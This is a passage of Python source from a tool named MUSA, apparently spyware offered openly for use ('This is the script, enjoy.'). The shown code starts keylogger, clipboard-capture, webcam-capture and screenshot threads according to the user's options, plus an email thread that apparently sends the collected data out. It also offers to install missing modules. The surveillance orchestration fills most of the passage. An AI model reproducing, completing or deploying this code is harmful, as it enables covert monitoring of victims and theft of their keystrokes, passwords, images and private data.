            Helping_Functions().O_symbol()
            print(" The email has been found, the script advances...")
            sleep(2)

        ### Poping up the logo of the script.
        Helping_Functions().load_frame()
        print(" MUSA is currently running (can stopped if 'Esc' is pressed)")
        print(colorama.Fore.LIGHTBLUE_EX, '-'*100, colorama.Style.RESET_ALL)
        sleep(0.75)


        ### Creating all the threads, according to what the user has chosen.
        if args[0]:
            k_logger_thread = Main().key_logger_thread(True)
        else:
            k_logger_thread = Main().key_logger_thread(False)

        if args[1]:
            clipboard_thread = Main().clipboard_paster_thread()

        if args[2]:
            camera_thread = Main().camera_capture_thread()

        if args[3]:
            screen_thread = Main().screen_shot_thread()

        ### Creating the email thread.
        email_thread = Main().Mail()


        ### Starting all the threads. If the user doesn't choose one the script
        ###   would get a NameError and if the thread is returning NoneType object
        ###   (our custon class), then it gets an AttributeError. So the prevent
        ###   the script from crashing we catch those errors.
        k_logger_thread.start()
        try:
            clipboard_thread.start()
        except (NameError, AttributeError):
            pass
        try:
            camera_thread.start()
        except (NameError, AttributeError):
            pass
        try:
            screen_thread.start()
        except (NameError, AttributeError):
            pass
        
        email_thread.start()
    else:
        ### If the user has some modules uninstall then the script prossed here.

        system(clear)

        ### Printing all the modules that the user has uninstalled.
        print("~> Musa is unable to start because some modules are uninstalled on your machine...")
        print("~> Those modules are:")
        print("\t", end='')
        for module in not_imported:
            print(module, end='\n\t')

        ### Then we give the user the choice to import them for him/her either using
        ###   pip or conda.

        while True:
            choice = input("\n~> Do you want them to be installed? (yes/y, no/n): ")
            if (choice == 'y') or (choice == "yes") or (choice == 'n') or (choice == "no"):
                break

            print("~> Invalid input... Please try again.")

        if (choice == "yes") or (choice == 'y'):
            while True:
                choice2 = input("~> Conda or pip? (conda/c, pip/p): ")
                if (choice2 == 'c') or (choice2 == "conda") or (choice2 == 'p') or (choice2 == "pip"):
                    break
                print("~> Invalid input... Please try again.")

            mediator = "pip" if (choice2 == 'p') or (choice2 == "pip") else "conda"

            for module in not_imported:
                system(f"{mediator} install {module}")

            print()
            if explicit:
                print("~> Note that you also need to install the specific drivers.")
                print("~> One of those: ")
                print("          Chrome driver: https://chromedriver.chromium.org/downloads")
                print("          Firefox driver: https://github.com/mozilla/geckodriver/releases")
                print("          Opera driver: https://github.com/operasoftware/operachromiumdriver/releases")
            else:
                print("~> Everything is set to start, please run the script again.")
        else:
            print()
            print("~> Terminating the script...")
            sleep(1)


### This is the script, enjoy.
